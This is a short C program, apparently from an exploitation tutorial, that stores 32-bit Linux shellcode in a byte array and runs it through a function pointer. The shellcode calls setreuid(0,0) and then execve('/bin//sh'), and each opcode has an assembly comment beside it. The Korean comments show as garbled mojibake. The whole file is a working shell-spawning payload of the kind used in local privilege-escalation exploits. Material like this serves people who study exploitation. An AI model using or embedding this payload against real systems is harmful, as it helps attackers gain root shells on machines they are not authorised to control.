char sc[] =	// ĳ���� ���ϰ� ���� ������ �������
	// setreuid(0,0)
	"\x31\xc0"		//  xor	%eax,%eax
	"\xb0\x46"		//  mov	$0x46,%al
	"\x31\xdb"		//  xor	%ebx,%ebx
	"\x31\xc9"		//  xor	%ecx,%ecx
	"\xcd\x80"		//  int	$0x80
	// execve�� ���ڵ� ����
	"\x31\xc0"		//  xor	%eax,%eax
	"\x50"				//  push	%eax
	"\x68\x2f\x2f\x73\x68"	//  push	$0x68732f2f
	"\x68\x2f\x62\x69\x6e"	//  push	$0x6e69622f
	"\x89\xe3"		//  mov	%esp,%ebx
	"\x50"				//  push	%eax
	"\x53"				//  push	%ebx
	"\x89\xe1"		//  mov	%esp,%ecx
	"\x31\xd2"		//  xor	%edx,%edx
	"\xb0\x0b"		//  mov	$0xb,%al
	"\xcd\x80";		//  int	$0x80	(;) ���ڿ��� ��

main()
{
	void (*fp) (void);	// �Լ� ������ fp ����
	fp = (void *)sc;		// fp�� �ּҰ� ���ڵ带 ����Ű���� ����
	fp();							// �Լ� ����(���ڵ�)
}
